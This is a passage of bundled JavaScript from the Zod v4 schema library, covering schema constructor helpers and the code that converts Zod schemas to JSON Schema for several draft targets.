}
function _record(Class2, keyType, valueType, params) {
  return new Class2({
    type: "record",
    keyType,
    valueType,
    ...normalizeParams(params)
  });
}
function _map(Class2, keyType, valueType, params) {
  return new Class2({
    type: "map",
    keyType,
    valueType,
    ...normalizeParams(params)
  });
}
function _set(Class2, valueType, params) {
  return new Class2({
    type: "set",
    valueType,
    ...normalizeParams(params)
  });
}
function _enum(Class2, values, params) {
  const entries = Array.isArray(values) ? Object.fromEntries(values.map((v) => [v, v])) : values;
  return new Class2({
    type: "enum",
    entries,
    ...normalizeParams(params)
  });
}
function _nativeEnum(Class2, entries, params) {
  return new Class2({
    type: "enum",
    entries,
    ...normalizeParams(params)
  });
}
function _literal(Class2, value, params) {
  return new Class2({
    type: "literal",
    values: Array.isArray(value) ? value : [value],
    ...normalizeParams(params)
  });
}
function _file(Class2, params) {
  return new Class2({
    type: "file",
    ...normalizeParams(params)
  });
}
function _transform(Class2, fn) {
  return new Class2({
    type: "transform",
    transform: fn
  });
}
function _optional(Class2, innerType) {
  return new Class2({
    type: "optional",
    innerType
  });
}
function _nullable(Class2, innerType) {
  return new Class2({
    type: "nullable",
    innerType
  });
}
function _default(Class2, innerType, defaultValue) {
  return new Class2({
    type: "default",
    innerType,
    get defaultValue() {
      return typeof defaultValue === "function" ? defaultValue() : shallowClone(defaultValue);
    }
  });
}
function _nonoptional(Class2, innerType, params) {
  return new Class2({
    type: "nonoptional",
    innerType,
    ...normalizeParams(params)
  });
}
function _success(Class2, innerType) {
  return new Class2({
    type: "success",
    innerType
  });
}
function _catch(Class2, innerType, catchValue) {
  return new Class2({
    type: "catch",
    innerType,
    catchValue: typeof catchValue === "function" ? catchValue : () => catchValue
  });
}
function _pipe(Class2, in_, out) {
  return new Class2({
    type: "pipe",
    in: in_,
    out
  });
}
function _readonly(Class2, innerType) {
  return new Class2({
    type: "readonly",
    innerType
  });
}
function _templateLiteral(Class2, parts, params) {
  return new Class2({
    type: "template_literal",
    parts,
    ...normalizeParams(params)
  });
}
function _lazy(Class2, getter) {
  return new Class2({
    type: "lazy",
    getter
  });
}
function _promise(Class2, innerType) {
  return new Class2({
    type: "promise",
    innerType
  });
}
function _custom(Class2, fn, _params) {
  const norm = normalizeParams(_params);
  norm.abort ?? (norm.abort = true);
  const schema = new Class2({
    type: "custom",
    check: "custom",
    fn,
    ...norm
  });
  return schema;
}
function _refine(Class2, fn, _params) {
  const schema = new Class2({
    type: "custom",
    check: "custom",
    fn,
    ...normalizeParams(_params)
  });
  return schema;
}
function _superRefine(fn) {
  const ch = _check((payload) => {
    payload.addIssue = (issue2) => {
      if (typeof issue2 === "string") {
        payload.issues.push(issue(issue2, payload.value, ch._zod.def));
      } else {
        const _issue = issue2;
        if (_issue.fatal)
          _issue.continue = false;
        _issue.code ?? (_issue.code = "custom");
        _issue.input ?? (_issue.input = payload.value);
        _issue.inst ?? (_issue.inst = ch);
        _issue.continue ?? (_issue.continue = !ch._zod.def.abort);
        payload.issues.push(issue(_issue));
      }
    };
    return fn(payload.value, payload);
  });
  return ch;
}
function _check(fn, params) {
  const ch = new $ZodCheck({
    check: "custom",
    ...normalizeParams(params)
  });
  ch._zod.check = fn;
  return ch;
}
function describe(description) {
  const ch = new $ZodCheck({ check: "describe" });
  ch._zod.onattach = [
    (inst) => {
      const existing = globalRegistry.get(inst) ?? {};
      globalRegistry.add(inst, { ...existing, description });
    }
  ];
  ch._zod.check = () => {};
  return ch;
}
function meta(metadata) {
  const ch = new $ZodCheck({ check: "meta" });
  ch._zod.onattach = [
    (inst) => {
      const existing = globalRegistry.get(inst) ?? {};
      globalRegistry.add(inst, { ...existing, ...metadata });
    }
  ];
  ch._zod.check = () => {};
  return ch;
}
function _stringbool(Classes, _params) {
  const params = normalizeParams(_params);
  let truthyArray = params.truthy ?? ["true", "1", "yes", "on", "y", "enabled"];
  let falsyArray = params.falsy ?? ["false", "0", "no", "off", "n", "disabled"];
  if (params.case !== "sensitive") {
    truthyArray = truthyArray.map((v) => typeof v === "string" ? v.toLowerCase() : v);
    falsyArray = falsyArray.map((v) => typeof v === "string" ? v.toLowerCase() : v);
  }
  const truthySet = new Set(truthyArray);
  const falsySet = new Set(falsyArray);
  const _Codec = Classes.Codec ?? $ZodCodec;
  const _Boolean = Classes.Boolean ?? $ZodBoolean;
  const _String = Classes.String ?? $ZodString;
  const stringSchema = new _String({ type: "string", error: params.error });
  const booleanSchema = new _Boolean({ type: "boolean", error: params.error });
  const codec = new _Codec({
    type: "pipe",
    in: stringSchema,
    out: booleanSchema,
    transform: (input, payload) => {
      let data = input;
      if (params.case !== "sensitive")
        data = data.toLowerCase();
      if (truthySet.has(data)) {
        return true;
      } else if (falsySet.has(data)) {
        return false;
      } else {
        payload.issues.push({
          code: "invalid_value",
          expected: "stringbool",
          values: [...truthySet, ...falsySet],
          input: payload.value,
          inst: codec,
          continue: false
        });
        return {};
      }
    },
    reverseTransform: (input, _payload) => {
      if (input === true) {
        return truthyArray[0] || "true";
      } else {
        return falsyArray[0] || "false";
      }
    },
    error: params.error
  });
  return codec;
}
function _stringFormat(Class2, format, fnOrRegex, _params = {}) {
  const params = normalizeParams(_params);
  const def = {
    ...normalizeParams(_params),
    check: "string_format",
    type: "string",
    format,
    fn: typeof fnOrRegex === "function" ? fnOrRegex : (val) => fnOrRegex.test(val),
    ...params
  };
  if (fnOrRegex instanceof RegExp) {
    def.pattern = fnOrRegex;
  }
  const inst = new Class2(def);
  return inst;
}
// node_modules/zod/v4/core/to-json-schema.js
function initializeContext(params) {
  let target = params?.target ?? "draft-2020-12";
  if (target === "draft-4")
    target = "draft-04";
  if (target === "draft-7")
    target = "draft-07";
  return {
    processors: params.processors ?? {},
    metadataRegistry: params?.metadata ?? globalRegistry,
    target,
    unrepresentable: params?.unrepresentable ?? "throw",
    override: params?.override ?? (() => {}),
    io: params?.io ?? "output",
    counter: 0,
    seen: new Map,
    cycles: params?.cycles ?? "ref",
    reused: params?.reused ?? "inline",
    external: params?.external ?? undefined
  };
}
function process2(schema, ctx, _params = { path: [], schemaPath: [] }) {
  var _a2;
  const def = schema._zod.def;
  const seen = ctx.seen.get(schema);
  if (seen) {
    seen.count++;
    const isCycle = _params.schemaPath.includes(schema);
    if (isCycle) {
      seen.cycle = _params.path;
    }
    return seen.schema;
  }
  const result = { schema: {}, count: 1, cycle: undefined, path: _params.path };
  ctx.seen.set(schema, result);
  const overrideSchema = schema._zod.toJSONSchema?.();
  if (overrideSchema) {
    result.schema = overrideSchema;
  } else {
    const params = {
      ..._params,
      schemaPath: [..._params.schemaPath, schema],
      path: _params.path
    };
    if (schema._zod.processJSONSchema) {
      schema._zod.processJSONSchema(ctx, result.schema, params);
    } else {
      const _json = result.schema;
      const processor = ctx.processors[def.type];
      if (!processor) {
        throw new Error(`[toJSONSchema]: Non-representable type encountered: ${def.type}`);
      }
      processor(schema, ctx, _json, params);
    }
    const parent = schema._zod.parent;
    if (parent) {
      if (!result.ref)
        result.ref = parent;
      process2(parent, ctx, params);
      ctx.seen.get(parent).isParent = true;
    }
  }
  const meta2 = ctx.metadataRegistry.get(schema);
  if (meta2)
    Object.assign(result.schema, meta2);
  if (ctx.io === "input" && isTransforming(schema)) {
    delete result.schema.examples;
    delete result.schema.default;
  }
  if (ctx.io === "input" && result.schema._prefault)
    (_a2 = result.schema).default ?? (_a2.default = result.schema._prefault);
  delete result.schema._prefault;
  const _result = ctx.seen.get(schema);
  return _result.schema;
}
function extractDefs(ctx, schema) {
  const root = ctx.seen.get(schema);
  if (!root)
    throw new Error("Unprocessed schema. This is a bug in Zod.");
  const idToSchema = new Map;
  for (const entry of ctx.seen.entries()) {
    const id = ctx.metadataRegistry.get(entry[0])?.id;
    if (id) {
      const existing = idToSchema.get(id);
      if (existing && existing !== entry[0]) {
        throw new Error(`Duplicate schema id "${id}" detected during JSON Schema conversion. Two different schemas cannot share the same id when converted together.`);
      }
      idToSchema.set(id, entry[0]);
    }
  }
  const makeURI = (entry) => {
    const defsSegment = ctx.target === "draft-2020-12" ? "$defs" : "definitions";
    if (ctx.external) {
      const externalId = ctx.external.registry.get(entry[0])?.id;
      const uriGenerator = ctx.external.uri ?? ((id2) => id2);
      if (externalId) {
        return { ref: uriGenerator(externalId) };
      }
      const id = entry[1].defId ?? entry[1].schema.id ?? `schema${ctx.counter++}`;
      entry[1].defId = id;
      return { defId: id, ref: `${uriGenerator("__shared")}#/${defsSegment}/${id}` };
    }
    if (entry[1] === root) {
      return { ref: "#" };
    }
    const uriPrefix = `#`;
    const defUriPrefix = `${uriPrefix}/${defsSegment}/`;
    const defId = entry[1].schema.id ?? `__schema${ctx.counter++}`;
    return { defId, ref: defUriPrefix + defId };
  };
  const extractToDef = (entry) => {
    if (entry[1].schema.$ref) {
      return;
    }
    const seen = entry[1];
    const { ref, defId } = makeURI(entry);
    seen.def = { ...seen.schema };
    if (defId)
      seen.defId = defId;
    const schema2 = seen.schema;
    for (const key in schema2) {
      delete schema2[key];
    }
    schema2.$ref = ref;
  };
  if (ctx.cycles === "throw") {
    for (const entry of ctx.seen.entries()) {
      const seen = entry[1];
      if (seen.cycle) {
        throw new Error("Cycle detected: " + `#/${seen.cycle?.join("/")}/<root>` + '\n\nSet the `cycles` parameter to `"ref"` to resolve cyclical schemas with defs.');
      }
    }
  }
  for (const entry of ctx.seen.entries()) {
    const seen = entry[1];
    if (schema === entry[0]) {
      extractToDef(entry);
      continue;
    }
    if (ctx.external) {
      const ext = ctx.external.registry.get(entry[0])?.id;
      if (schema !== entry[0] && ext) {
        extractToDef(entry);
        continue;
      }
    }
    const id = ctx.metadataRegistry.get(entry[0])?.id;
    if (id) {
      extractToDef(entry);
      continue;
    }
    if (seen.cycle) {
      extractToDef(entry);
      continue;
    }
    if (seen.count > 1) {
      if (ctx.reused === "ref") {
        extractToDef(entry);
        continue;
      }
    }
  }
}
function finalize(ctx, schema) {
  const root = ctx.seen.get(schema);
  if (!root)
    throw new Error("Unprocessed schema. This is a bug in Zod.");
  const flattenRef = (zodSchema) => {
    const seen = ctx.seen.get(zodSchema);
    if (seen.ref === null)
      return;
    const schema2 = seen.def ?? seen.schema;
    const _cached = { ...schema2 };
    const ref = seen.ref;
    seen.ref = null;
    if (ref) {
      flattenRef(ref);
      const refSeen = ctx.seen.get(ref);
      const refSchema = refSeen.schema;
      if (refSchema.$ref && (ctx.target === "draft-07" || ctx.target === "draft-04" || ctx.target === "openapi-3.0")) {
        schema2.allOf = schema2.allOf ?? [];
        schema2.allOf.push(refSchema);
      } else {
        Object.assign(schema2, refSchema);
      }
      Object.assign(schema2, _cached);
      const isParentRef = zodSchema._zod.parent === ref;
      if (isParentRef) {
        for (const key in schema2) {
          if (key === "$ref" || key === "allOf")
            continue;
          if (!(key in _cached)) {
            delete schema2[key];
          }
        }
      }
      if (refSchema.$ref && refSeen.def) {
        for (const key in schema2) {
          if (key === "$ref" || key === "allOf")
            continue;
          if (key in refSeen.def && JSON.stringify(schema2[key]) === JSON.stringify(refSeen.def[key])) {
            delete schema2[key];
          }
        }
      }
    }
    const parent = zodSchema._zod.parent;
    if (parent && parent !== ref) {
      flattenRef(parent);
      const parentSeen = ctx.seen.get(parent);
      if (parentSeen?.schema.$ref) {
        schema2.$ref = parentSeen.schema.$ref;
        if (parentSeen.def) {
          for (const key in schema2) {
            if (key === "$ref" || key === "allOf")
              continue;
            if (key in parentSeen.def && JSON.stringify(schema2[key]) === JSON.stringify(parentSeen.def[key])) {
              delete schema2[key];
            }
          }
        }
      }
    }
    ctx.override({
      zodSchema,
      jsonSchema: schema2,
      path: seen.path ?? []
    });
  };
  for (const entry of [...ctx.seen.entries()].reverse()) {
    flattenRef(entry[0]);
  }
  const result = {};
  if (ctx.target === "draft-2020-12") {
    result.$schema = "https://json-schema.org/draft/2020-12/schema";
  } else if (ctx.target === "draft-07") {
    result.$schema = "http://json-schema.org/draft-07/schema#";
  } else if (ctx.target === "draft-04") {
    result.$schema = "http://json-schema.org/draft-04/schema#";
  } else if (ctx.target === "openapi-3.0") {} else {}
  if (ctx.external?.uri) {
    const id = ctx.external.registry.get(schema)?.id;
    if (!id)
      throw new Error("Schema is missing an `id` property");
    result.$id = ctx.external.uri(id);
  }
  Object.assign(result, root.def ?? root.schema);
  const defs = ctx.external?.defs ?? {};
  for (const entry of ctx.seen.entries()) {
    const seen = entry[1];
    if (seen.def && seen.defId) {
      defs[seen.defId] = seen.def;
    }
  }
  if (ctx.external) {} else {
    if (Object.keys(defs).length > 0) {
      if (ctx.target === "draft-2020-12") {
        result.$defs = defs;
      } else {
        result.definitions = defs;
      }
    }
  }
  try {
    const finalized = JSON.parse(JSON.stringify(result));
    Object.defineProperty(finalized, "~standard", {
      value: {
        ...schema["~standard"],
        jsonSchema: {
          input: createStandardJSONSchemaMethod(schema, "input", ctx.processors),
          output: createStandardJSONSchemaMethod(schema, "output", ctx.processors)
        }
      },
      enumerable: false,
      writable: false
    });
    return finalized;
  } catch (_err) {
    throw new Error("Error converting schema to JSON.");
  }
}
function isTransforming(_schema, _ctx) {
  const ctx = _ctx ?? { seen: new Set };
  if (ctx.seen.has(_schema))
    return false;
  ctx.seen.add(_schema);
  const def = _schema._zod.def;
  if (def.type === "transform")
    return true;
  if (def.type === "array")
    return isTransforming(def.element, ctx);
  if (def.type === "set")
    return isTransforming(def.valueType, ctx);
  if (def.type === "lazy")
    return isTransforming(def.getter(), ctx);
  if (def.type === "promise" || def.type === "optional" || def.type === "nonoptional" || def.type === "nullable" || def.type === "readonly" || def.type === "default" || def.type === "prefault") {
    return isTransforming(def.innerType, ctx);
  }
  if (def.type === "intersection") {
    return isTransforming(def.left, ctx) || isTransforming(def.right, ctx);
  }
  if (def.type === "record" || def.type === "map") {
    return isTransforming(def.keyType, ctx) || isTransforming(def.valueType, ctx);
  }
  if (def.type === "pipe") {
    return isTransforming(def.in, ctx) || isTransforming(def.out, ctx);
  }
  if (def.type === "object") {
    for (const key in def.shape) {
      if (isTransforming(def.shape[key], ctx))
        return true;
    }
    return false;
  }
  if (def.type === "union") {
    for (const option of def.options) {
      if (isTransforming(option, ctx))
        return true;
    }
    return false;
  }
  if (def.type === "tuple") {
    for (const item of def.items) {
      if (isTransforming(item, ctx))
        return true;
    }
    if (def.rest && isTransforming(def.rest, ctx))
      return true;
    return false;
  }
  return false;
}
var createToJSONSchemaMethod = (schema, processors = {}) => (params) => {
  const ctx = initializeContext({ ...params, processors });
  process2(schema, ctx);
  extractDefs(ctx, schema);
  return finalize(ctx, schema);
};
var createStandardJSONSchemaMethod = (schema, io, processors = {}) => (params) => {
  const { libraryOptions, target } = params ?? {};
  const ctx = initializeContext({ ...libraryOptions ?? {}, target, io, processors });
  process2(schema, ctx);
  extractDefs(ctx, schema);
  return finalize(ctx, schema);
};
// node_modules/zod/v4/core/json-schema-processors.js
var formatMap = {
  guid: "uuid",
  url: "uri",
  datetime: "date-time",
  json_string: "json-string",
  regex: ""
};
var stringProcessor = (schema, ctx, _json, _params) => {
  const json = _json;
  json.type = "string";
  const { minimum, maximum, format, patterns, contentEncoding } = schema._zod.bag;
  if (typeof minimum === "number")
    json.minLength = minimum;
  if (typeof maximum === "number")
    json.maxLength = maximum;
  if (format) {
    json.format = formatMap[format] ?? format;
    if (json.format === "")
      delete json.format;
    if (format === "time") {
      delete json.format;
    }
  }
  if (contentEncoding)
    json.contentEncoding = contentEncoding;
  if (patterns && patterns.size > 0) {
    const regexes = [...patterns];
    if (regexes.length === 1)
      json.pattern = regexes[0].source;
    else if (regexes.length > 1) {
      json.allOf = [
        ...regexes.map((regex) => ({
          ...ctx.target === "draft-07" || ctx.target === "draft-04" || ctx.target === "openapi-3.0" ? { type: "string" } : {},
          pattern: regex.source
        }))
      ];
    }
  }
};
var numberProcessor = (schema, ctx, _json, _params) => {
  const json = _json;
  const { minimum, maximum, format, multipleOf, exclusiveMaximum, exclusiveMinimum } = schema._zod.bag;
  if (typeof format === "string" && format.includes("int"))
    json.type = "integer";
  else
    json.type = "number";
  if (typeof exclusiveMinimum === "number") {
    if (ctx.target === "draft-04" || ctx.target === "openapi-3.0") {
      json.minimum = exclusiveMinimum;
      json.exclusiveMinimum = true;
    } else {
      json.exclusiveMinimum = exclusiveMinimum;
    }
  }
  if (typeof minimum === "number") {
    json.minimum = minimum;
    if (typeof exclusiveMinimum === "number" && ctx.target !== "draft-04") {
      if (exclusiveMinimum >= minimum)
        delete json.minimum;
      else
        delete json.exclusiveMinimum;
    }
  }
  if (typeof exclusiveMaximum === "number") {
    if (ctx.target === "draft-04" || ctx.target === "openapi-3.0") {
      json.maximum = exclusiveMaximum;
      json.exclusiveMaximum = true;
    } else {
      json.exclusiveMaximum = exclusiveMaximum;
    }
  }
  if (typeof maximum === "number") {
    json.maximum = maximum;
    if (typeof exclusiveMaximum === "number" && ctx.target !== "draft-04") {
      if (exclusiveMaximum <= maximum)
        delete json.maximum;
      else
        delete json.exclusiveMaximum;
    }
  }
  if (typeof multipleOf === "number")
    json.multipleOf = multipleOf;
};
var booleanProcessor = (_schema, _ctx, json, _params) => {
  json.type = "boolean";
};
var bigintProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("BigInt cannot be represented in JSON Schema");
  }
};
var symbolProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Symbols cannot be represented in JSON Schema");
  }
};
var nullProcessor = (_schema, ctx, json, _params) => {
  if (ctx.target === "openapi-3.0") {
    json.type = "string";
    json.nullable = true;
    json.enum = [null];
  } else {
    json.type = "null";
  }
};
var undefinedProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Undefined cannot be represented in JSON Schema");
  }
};
var voidProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Void cannot be represented in JSON Schema");
  }
};
var neverProcessor = (_schema, _ctx, json, _params) => {
  json.not = {};
};
var anyProcessor = (_schema, _ctx, _json, _params) => {};
var unknownProcessor = (_schema, _ctx, _json, _params) => {};
var dateProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Date cannot be represented in JSON Schema");
  }
};
var enumProcessor = (schema, _ctx, json, _params) => {
  const def = schema._zod.def;
  const values = getEnumValues(def.entries);
  if (values.every((v) => typeof v === "number"))
    json.type = "number";
  if (values.every((v) => typeof v === "string"))
    json.type = "string";
  json.enum = values;
};
var literalProcessor = (schema, ctx, json, _params) => {
  const def = schema._zod.def;
  const vals = [];
  for (const val of def.values) {
    if (val === undefined) {
      if (ctx.unrepresentable === "throw") {
        throw new Error("Literal `undefined` cannot be represented in JSON Schema");
      } else {}
    } else if (typeof val === "bigint") {
      if (ctx.unrepresentable === "throw") {
        throw new Error("BigInt literals cannot be represented in JSON Schema");
      } else {
        vals.push(Number(val));
      }
    } else {
      vals.push(val);
    }
  }
  if (vals.length === 0) {} else if (vals.length === 1) {
    const val = vals[0];
    json.type = val === null ? "null" : typeof val;
    if (ctx.target === "draft-04" || ctx.target === "openapi-3.0") {
      json.enum = [val];
    } else {
      json.const = val;
    }
  } else {
    if (vals.every((v) => typeof v === "number"))
      json.type = "number";
    if (vals.every((v) => typeof v === "string"))
      json.type = "string";
    if (vals.every((v) => typeof v === "boolean"))
      json.type = "boolean";
    if (vals.every((v) => v === null))
      json.type = "null";
    json.enum = vals;
  }
};
var nanProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("NaN cannot be represented in JSON Schema");
  }
};
var templateLiteralProcessor = (schema, _ctx, json, _params) => {
  const _json = json;
  const pattern = schema._zod.pattern;
  if (!pattern)
    throw new Error("Pattern not found in template literal");
  _json.type = "string";
  _json.pattern = pattern.source;
};
var fileProcessor = (schema, _ctx, json, _params) => {
  const _json = json;
  const file = {
    type: "string",
    format: "binary",
    contentEncoding: "binary"
  };
  const { minimum, maximum, mime } = schema._zod.bag;
  if (minimum !== undefined)
    file.minLength = minimum;
  if (maximum !== undefined)
    file.maxLength = maximum;
  if (mime) {
    if (mime.length === 1) {
      file.contentMediaType = mime[0];
      Object.assign(_json, file);
    } else {
      Object.assign(_json, file);
      _json.anyOf = mime.map((m) => ({ contentMediaType: m }));
    }
  } else {
    Object.assign(_json, file);
  }
};
var successProcessor = (_schema, _ctx, json, _params) => {
  json.type = "boolean";
};
var customProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Custom types cannot be represented in JSON Schema");
  }
};
var functionProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Function types cannot be represented in JSON Schema");
  }
};
var transformProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Transforms cannot be represented in JSON Schema");
  }
};
var mapProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Map cannot be represented in JSON Schema");
  }
};
var setProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Set cannot be represented in JSON Schema");
  }
};
var arrayProcessor = (schema, ctx, _json, params) => {
  const json = _json;
  const def = schema._zod.def;
  const { minimum, maximum } = schema._zod.bag;
  if (typeof minimum === "number")
    json.minItems = minimum;
  if (typeof maximum === "number")
    json.maxItems = maximum;
  json.type = "array";
  json.items = process2(def.element, ctx, { ...params, path: [...params.path, "items"] });
};
var objectProcessor = (schema, ctx, _json, params) => {
  const json = _json;
  const def = schema._zod.def;
  json.type = "object";
  json.properties = {};
  const shape = def.shape;
  for (const key in shape) {
    json.properties[key] = process2(shape[key], ctx, {
      ...params,
      path: [...params.path, "properties", key]
    });
  }
  const allKeys = new Set(Object.keys(shape));
  const requiredKeys = new Set([...allKeys].filter((key) => {
    const v = def.shape[key]._zod;
    if (ctx.io === "input") {
      return v.optin === undefined;
    } else {
      return v.optout === undefined;
    }
  }));
  if (requiredKeys.size > 0) {
    json.required = Array.from(requiredKeys);
  }
  if (def.catchall?._zod.def.type === "never") {
    json.additionalProperties = false;
  } else if (!def.catchall) {
    if (ctx.io === "output")
      json.additionalProperties = false;
  } else if (def.catchall) {
    json.additionalProperties = process2(def.catchall, ctx, {
      ...params,
      path: [...params.path, "additionalProperties"]
    });
  }
};
var unionProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  const isExclusive = def.inclusive === false;
  const options = def.options.map((x, i) => process2(x, ctx, {
    ...params,
    path: [...params.path, isExclusive ? "oneOf" : "anyOf", i]
  }));
  if (isExclusive) {
    json.oneOf = options;
  } else {
    json.anyOf = options;
  }
};
var intersectionProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  const a = process2(def.left, ctx, {
    ...params,
    path: [...params.path, "allOf", 0]
  });
  const b = process2(def.right, ctx, {
    ...params,
    path: [...params.path, "allOf", 1]
  });
  const isSimpleIntersection = (val) => ("allOf" in val) && Object.keys(val).length === 1;
  const allOf = [
    ...isSimpleIntersection(a) ? a.allOf : [a],
    ...isSimpleIntersection(b) ? b.allOf : [b]
  ];
  json.allOf = allOf;
};
var tupleProcessor = (schema, ctx, _json, params) => {
  const json = _json;
  const def = schema._zod.def;
  json.type = "array";
  const prefixPath = ctx.target === "draft-2020-12" ? "prefixItems" : "items";
  const restPath = ctx.target === "draft-2020-12" ? "items" : ctx.target === "openapi-3.0" ? "items" : "additionalItems";
  const prefixItems = def.items.map((x, i) => process2(x, ctx, {
    ...params,
    path: [...params.path, prefixPath, i]
  }));
  const rest = def.rest ? process2(def.rest, ctx, {
    ...params,
    path: [...params.path, restPath, ...ctx.target === "openapi-3.0" ? [def.items.length] : []]
  }) : null;
  if (ctx.target === "draft-2020-12") {
    json.prefixItems = prefixItems;
    if (rest) {
      json.items = rest;
    }
  } else if (ctx.target === "openapi-3.0") {
    json.items = {
      anyOf: prefixItems
    };
    if (rest) {
      json.items.anyOf.push(rest);
    }
    json.minItems = prefixItems.length;
    if (!rest) {
      json.maxItems = prefixItems.length;
    }
  } else {
    json.items = prefixItems;
    if (rest) {
      json.additionalItems = rest;
    }
  }
  const { minimum, maximum } = schema._zod.bag;
  if (typeof minimum === "number")
    json.minItems = minimum;
  if (typeof maximum === "number")
    json.maxItems = maximum;
};
var recordProcessor = (schema, ctx, _json, params) => {
  const json = _json;
  const def = schema._zod.def;
  json.type = "object";
  const keyType = def.keyType;
  const keyBag = keyType._zod.bag;
  const patterns = keyBag?.patterns;
  if (def.mode === "loose" && patterns && patterns.size > 0) {
    const valueSchema = process2(def.valueType, ctx, {
      ...params,
      path: [...params.path, "patternProperties", "*"]
    });
    json.patternProperties = {};
    for (const pattern of patterns) {
      json.patternProperties[pattern.source] = valueSchema;
    }
  } else {
    if (ctx.target === "draft-07" || ctx.target === "draft-2020-12") {
      json.propertyNames = process2(def.keyType, ctx, {
        ...params,
        path: [...params.path, "propertyNames"]
      });
    }
    json.additionalProperties = process2(def.valueType, ctx, {
      ...params,
      path: [...params.path, "additionalProperties"]
    });
  }
  const keyValues = keyType._zod.values;
  if (keyValues) {
    const validKeyValues = [...keyValues].filter((v) => typeof v === "string" || typeof v === "number");
    if (validKeyValues.length > 0) {
      json.required = validKeyValues;
    }
  }
};
var nullableProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  const inner = process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  if (ctx.target === "openapi-3.0") {
    seen.ref = def.innerType;
    json.nullable = true;
  } else {
    json.anyOf = [inner, { type: "null" }];
  }
};
var nonoptionalProcessor = (schema, ctx, _json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
};
var defaultProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
  json.default = JSON.parse(JSON.stringify(def.defaultValue));
};
var prefaultProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
  if (ctx.io === "input")
    json._prefault = JSON.parse(JSON.stringify(def.defaultValue));
};
var catchProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
  let catchValue;
  try {
    catchValue = def.catchValue(undefined);
  } catch {
    throw new Error("Dynamic catch values are not supported in JSON Schema");
  }
  json.default = catchValue;
};
var pipeProcessor = (schema, ctx, _json, params) => {
  const def = schema._zod.def;
  const innerType = ctx.io === "input" ? def.in._zod.def.type === "transform" ? def.out : def.in : def.out;
  process2(innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = innerType;
};
var readonlyProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
  json.readOnly = true;
};
var promiseProcessor = (schema, ctx, _json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
};
var optionalProcessor = (schema, ctx, _json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
};
var lazyProcessor = (schema, ctx, _json, params) => {
  const innerType = schema._zod.innerType;
  process2(innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = innerType;
};
var allProcessors = {
  string: stringProcessor,
  number: numberProcessor,
  boolean: booleanProcessor,
  bigint: bigintProcessor,
  symbol: symbolProcessor,
  null: nullProcessor,
  undefined: undefinedProcessor,
  void: voidProcessor,
  never: neverProcessor,
  any: anyProcessor,
  unknown: unknownProcessor,
  date: dateProcessor,
  enum: enumProcessor,
  literal: literalProcessor,
  nan: nanProcessor,
  template_literal: templateLiteralProcessor,
  file: fileProcessor,
  success: successProcessor,
  custom: customProcessor,
  function: functionProcessor,
  transform: transformProcessor,
  map: mapProcessor,
  set: setProcessor,
  array: arrayProcessor,
  object: objectProcessor,
  union: unionProcessor,
  intersection: intersectionProcessor,
  tuple: tupleProcessor,
  record: recordProcessor,
  nullable: nullableProcessor,
  nonoptional: nonoptionalProcessor,
  default: defaultProcessor,
  prefault: prefaultProcessor,
  catch: catchProcessor,
  pipe: pipeProcessor,
  readonly: readonlyProcessor,
  promise: promiseProcessor,
  optional: optionalProcessor,
  lazy: lazyProcessor
};
function toJSONSchema(input, params) {
  if ("_idmap" in input) {
    const registry2 = input;
    const ctx2 = initializeContext({ ...params, processors: allProcessors });
    const defs = {};
    for (const entry of registry2._idmap.entries()) {
      const [_, schema] = entry;
      process2(schema, ctx2);
    }
    const schemas = {};
    const external = {
      registry: registry2,
      uri: params?.uri,
      defs
    };
    ctx2.external = external;
    for (const entry of registry2._idmap.entries()) {
      const [key, schema] = entry;
      extractDefs(ctx2, schema);
      schemas[key] = finalize(ctx2, schema);
    }
    if (Object.keys(defs).length > 0) {
      const defsSegment = ctx2.target === "draft-2020-12" ? "$defs" : "definitions";
      schemas.__shared = {
        [defsSegment]: defs
      };
    }
    return { schemas };
  }
  const ctx = initializeContext({ ...params, processors: allProcessors });
  process2(input, ctx);
  extractDefs(ctx, input);
  return finalize(ctx, input);
}
// node_modules/zod/v4/core/json-schema-generator.js
class JSONSchemaGenerator {
  get metadataRegistry() {
    return this.ctx.metadataRegistry;
  }
  get target() {
    return this.ctx.target;
  }
  get unrepresentable() {
    return this.ctx.unrepresentable;
  }
  get override() {
    return this.ctx.override;
  }
  get io() {
    return this.ctx.io;
  }
  get counter() {
